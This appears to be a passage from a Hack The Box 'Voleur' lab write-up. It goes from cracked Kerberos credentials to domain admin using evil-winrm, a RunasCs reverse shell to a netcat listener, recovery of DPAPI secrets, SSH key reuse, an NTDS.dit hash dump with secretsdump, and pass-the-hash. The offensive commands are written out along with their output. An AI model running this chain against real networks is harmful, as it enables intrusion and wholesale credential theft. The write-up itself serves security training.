eb5eb76290f32a6c7c286c466146af6b50180ce8260991156ae876e4040f52be2a2a6bcaeb7f6b3423fd5cb8e127e96608de7b2e0a6865cccca70b4ebd34f1e67c50b3aea0325dfd6ac1b72fea91627627cb40e910a7c34d204af2b649554f0097d8229b3912bf6b28caad5f701c0c0d8a5d124ac16ec04e856cbc76cf97f548a73e123822736f09763a6cbf47ddd9400b8a002bb8b533c46276d8a808a0c24309e39230c0f19f66a207f9b58dfb780b4fb607794e26940cc9f6a7294092e54a96af6b2634b5d99899160bc5b0005be30a6427c9578502ef35ea4466792c6f58346cee238f3f9858600118b633f0639afc00ba438aaa5f371b837a0f1a6ba3d928c0424215e5906e61292eff0250c0545121f94caffb197f9c2deb22562fba84426ba9e2b70db08802fadb16b7d328dbcbd5746a04e70cb0ae38db2f083edd70d90c46e31ccabdb31e0dbf7d23162fb0d3e8563d2a03d699a2e6e84fb4824926b7cc5f729dcebbb8b973df57e73f3b3dbf378a17ddd:AFireInsidedeOzarctica980219afi
```

So we can only crack `svc_winrm` password. <br>
&rarr; `svc_winrm:AFireInsidedeOzarctica980219afi`.

Request the **Ticket Granting Ticket** for `svc_winrm` user.

```bash
└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
```

Then update the `KRB5CCNAME` environment variable.

```bash
└─$ export KRB5CCNAME=svc_winrm.ccache
```

```powershell
└─$ evil-winrm -i dc.voleur.htb -u svc_winrm -r voleur.htb  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_winrm> cd Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> dir


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---          7/6/2025   2:47 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
8c103ff6981c5d164824c7d6f9152441
```

Got the `user.txt` flag.

## Initial Access
### Discovery
As we got initial access to `svc_winrm` user, but we need to be `svc_ldap` user so that we can enumerate the **Deleted Objects** and can restore it. <br>
&rarr; We gonna use [RunasCs](https://github.com/antonioCoco/RunasCs) to impersonate the `svc_ldap` user.

So we need to download the `RunasCs.exe` into our kali and then create a `Temp` folder in `svc_winrm` session and upload the `RunasCs.exe` into it.

```powershell
*Evil-WinRM* PS C:\> mkdir Temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          7/7/2025   5:49 AM                Temp


*Evil-WinRM* PS C:\> cd Temp
*Evil-WinRM* PS C:\Temp> upload RunasCs.exe
                                        
Info: Uploading /home/kali/HTB_Labs/DEPTHS_Season8/Voleur/RunasCs.exe to C:\Temp\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

Start the listener on our kali machine.

```bash
└─$ rlwrap -cAr nc -lvnp 3333
listening on [any] 3333 ...
```

On `svc_winrm` session, run the `RunasCs.exe` with the `svc_ldap` user.

```powershell
*Evil-WinRM* PS C:\Temp> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.14.48:3333
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-e9c6b3$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 5992 created in background.
```

Check back our kali machine.

```bash
└─$ rlwrap -cAr nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.14.48] from (UNKNOWN) [10.129.98.35] 54938
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
voleur\svc_ldap
```

Got the connection as `svc_ldap` user.

### Deleted Objects
Now we gonna use [Get-ADObject](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adobject?view=windowsserver2025-ps) to enumerate the **Deleted Objects**.

```powershell
PS C:\Windows\system32> Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties * | Where-Object {$_.ObjectClass -eq "user"} | Format-List *
Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties * | Where-Object {$_.ObjectClass -eq "user"} | Format-List *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : voleur.htb/Deleted Objects/Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
CN                              : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
codePage                        : 0
countryCode                     : 0
Created                         : 1/29/2025 1:08:06 AM
createTimeStamp                 : 1/29/2025 1:08:06 AM
Deleted                         : True
Description                     : Second-Line Support Technician
DisplayName                     : Todd Wolfe
DistinguishedName               : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted 
                                  Objects,DC=voleur,DC=htb
dSCorePropagationData           : {7/7/2025 5:57:42 AM, 5/13/2025 4:11:10 PM, 1/29/2025 4:52:29 AM, 1/29/2025 4:49:29 
                                  AM...}
givenName                       : Todd
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Second-Line Support Technicians,DC=voleur,DC=htb
lastLogoff                      : 0
lastLogon                       : 133826301603754403
lastLogonTimestamp              : 133826287869758230
logonCount                      : 3
memberOf                        : {CN=Second-Line Technicians,DC=voleur,DC=htb, CN=Remote Management 
                                  Users,CN=Builtin,DC=voleur,DC=htb}
Modified                        : 7/7/2025 6:07:44 AM
modifyTimeStamp                 : 7/7/2025 6:07:44 AM
msDS-LastKnownRDN               : Todd Wolfe
Name                            : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : 
ObjectClass                     : user
ObjectGUID                      : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid                       : S-1-5-21-3927696377-1337352550-2781715495-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133826280731790960
sAMAccountName                  : todd.wolfe
sDRightsEffective               : 0
sn                              : Wolfe
userAccountControl              : 66048
userPrincipalName               : todd.wolfe@voleur.htb
uSNChanged                      : 131311
uSNCreated                      : 12863
whenChanged                     : 7/7/2025 6:07:44 AM
whenCreated                     : 1/29/2025 1:08:06 AM
PropertyNames                   : {accountExpires, badPasswordTime, badPwdCount, CanonicalName...}
AddedProperties                 : {}
RemovedProperties               : {}
ModifiedProperties              : {}
PropertyCount                   : 44
```

> Need to switch to powershell by running `powershell` command.

So we got the `Todd.Wolfe` user information, let's restore it.

```powershell
PS C:\Windows\system32> Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
```

Check if the account is restored.

```powershell
PS C:\Windows\system32> net user /domain
net user /domain

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe <-- This is the account we restored.           
The command completed successfully.
```

Let's request the **Ticket Granting Ticket** for `todd.wolfe` user.

```bash
└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/todd.wolfe:NightT1meP1dg3on14'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache
```

Change the `KRB5CCNAME` environment variable.

```bash
└─$ export KRB5CCNAME=todd.wolfe.ccache
```

Let's access to `todd.wolfe` shares cause we know that this account is from Second-Line Support Technician.

```bash
└─$ smbclient.py -k dc.voleur.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Mon Jul  7 08:49:18 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 09:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 10:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 07:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 07:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 07:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 10:13:10 2025 Videos
```

### DPAPI Secrets
Let's check for this account's [DPAPI Secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets).
```bash
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:07 2025 ..
-rw-rw-rw-      11068  Wed Jan 29 08:06:56 2025 DFBE70A7E5CC19A398EBF1B96859CE5D
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D
# get DFBE70A7E5CC19A398EBF1B96859CE5D
```

Got the credentials.

```bash
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 08:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 07:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 07:53:08 2025 Preferred
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```

Got the DPAPI master key. <br>
&rarr; Let's decrypt the master key.

We gonna decrypt a master key first with the credentials we got.

```bash
└─$ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Now we gonna decrypt DPAPI-protected data with the master key.

```bash
└─$ dpapi.py credential -file DFBE70A7E5CC19A398EBF1B96859CE5D -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:53:10+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : WindowsLive:target=virtualapp/didlogical
Description : PersistedCredential
Unknown     : 
Username    : 02xsqpzotltkxgpg
Unknown     : 

KeyWord : Microsoft_WindowsLive:authstate:0
Data    : 
 0000   01 00 00 00 D0 8C 9D DF  01 15 D1 11 8C 7A 00 C0   .............z..
 0010   4F C2 97 EB 01 00 00 00  56 3E F0 43 9A 7E 25 47   O.......V>.C.~%G
 0020   AD 0D 14 50 50 1C 82 AA  00 00 00 00 02 00 00 00   ...PP...........
 0030   00 00 10 66 00 00 00 01  00 00 20 00 00 00 77 BC   ...f...... ...w.
 0040   33 CC 11 25 B2 28 2C 53  38 B6 BF 79 0C 61 47 9D   3..%.(,S8..y.aG.
 0050   FF B3 C2 61 86 33 57 38  B1 6B D1 AC 27 86 00 00   ...a.3W8.k..'...
 0060   00 00 0E 80 00 00 00 02  00 00 20 00 00 00 A3 B8   .......... .....
 0070   5D 10 4A 8C AB BE 88 FD  AF DA AE 43 FF AC 8E E2   ].J........C....
 0080   B5 85 C0 7C 42 6E 6E 8A  99 06 CE 06 94 D3 90 1E   ...|Bnn.........
 0090   00 00 D7 1C CC 67 66 52  D0 CB E4 4F D1 71 0D A0   .....gfR...O.q..
 00a0   8C 7C 58 CD 43 BA A2 DE  4B F6 6F 60 E5 9A 79 4B   .|X.C...K.o`..yK
 00b0   62 9F D0 8B 79 9D F3 4A  87 7E 15 15 DD A5 03 83   b...y..J.~......
 00c0   B4 1F 1D 05 92 A1 94 C2  4A 29 62 F7 EB 1A AD BD   ........J)b.....
 00d0   2C 84 31 A6 F4 ED 68 88  87 DE 5D 04 3F 5B 13 F4   ,.1...h...].?[..
 00e0   35 8A E2 5C A6 0B A2 9A  B9 75 9F 1E 91 11 E1 A7   5..\.....u......
 00f0   DB 6B 19 61 BE FF 80 25  78 E8 3F 50 96 CC AA 41   .k.a...%x.?P...A
...
```

Hmm, got nothing. <br>
When double check, we need to forgot to check this `C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\` folder. <br>
&rarr; Let's check it out.

```bash
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 08:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials
```

Got the different credentials. <br>
&rarr; Let's decrypt again.

```bash
└─$ dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Nail the credentials from the `jeremy.combs` user.
&rarr; `jeremy.combs:qT3V9pLXyN7W4m`

Just redo the request for the **Ticket Granting Ticket** for `jeremy.combs` user and change the `KRB5CCNAME` environment variable.

```bash
└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/jeremy.combs:qT3V9pLXyN7W4m'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
```

```bash
└─$ export KRB5CCNAME=jeremy.combs.ccache
```

Let's check the **SMB** shares.

```bash
└─$ smbclient.py -k dc.voleur.htb        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Mon Jul  7 12:56:30 2025 ..
drw-rw-rw-          0  Thu Jan 30 11:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 11:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 11:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 11:07:35 2025 Note.txt.txt
# mget *
[*] Downloading id_rsa
[*] Downloading Note.txt.txt
```

Found out the `id_rsa` file and `Note.txt.txt` file.

## Privilege Escalation
Let's check out the `Note.txt.txt` file.

```bash
└─$ cat Note.txt.txt  
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

So this is from `Admin` to `Jeremy.Combs` user. It said that has part configured WSL so there may be chance WSL will automate mount Windows drives to `/mnt`. <br>
&rarr; The `id_rsa` is gonna be for `svc_backup` user.

> *Notice:* In the nmap result there is `port 2222` open.

Let's add permission to `id_rsa` file.

```bash
└─$ chmod 600 id_rsa
```

Now ssh to `svc_backup` user.

```bash
└─$ ssh svc_backup@voleur.htb -i id_rsa -p 2222
The authenticity of host '[voleur.htb]:2222 ([10.129.98.35]:2222)' can't be established.
ED25519 key fingerprint is SHA256:mKWAEwLTnEN2bJNi7fkc+BZodiXCIiP3ywSLJiZL0ss.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[voleur.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul  7 10:09:50 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   33%       IPv4 address for eth0: 10.129.98.35
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                                                                                                                                                                         [ OK ] 
svc_backup@DC:~$
```

### NTDS Secrets
Check the `/mnt` folder and got interesting stuffs.
```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -la
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30 03:49 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30 03:49 ntds.jfm

svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la
total 17952
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..
-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30 03:30 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30 03:30 SYSTEM
```

Let's download these files.

```bash
└─$ scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* .
ntds.dit                                                                                                                                                                                                                                                                                  100%   24MB   1.0MB/s   00:23    
ntds.jfm
```

```bash
└─$ scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/* .         
SECURITY                                                                                                                                                                                                                                                                                  100%   32KB  67.1KB/s   00:00    
SYSTEM
```

Checking this [article](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds) to dump the NTDS secrets. <br>
&rarr; We gonna use [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) to dump the NTDS secrets.

```bash
└─$ secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
```

Got the `Administrator` hash. <br>
&rarr; Let's request the **Ticket Granting Ticket** for `Administrator` user.

```bash
└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/Administrator' -hashes :e656e07c56d831611b577b160b259ad2
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

Then update the `KRB5CCNAME` environment variable.

```bash
└─$ export KRB5CCNAME=Administrator.ccache
```

Now we can able to access the `Administrator`.

```powershell
└─$ evil-winrm -i dc.voleur.htb -u Administrator -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   1:12 AM           2308 Microsoft Edge.lnk
-ar---          7/7/2025   9:54 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
58b2cadb9fe8745d4c516baa59980518
```

Grab the `root.txt` flag.

![result](/assets/img/voleur-htb-season8/result.png)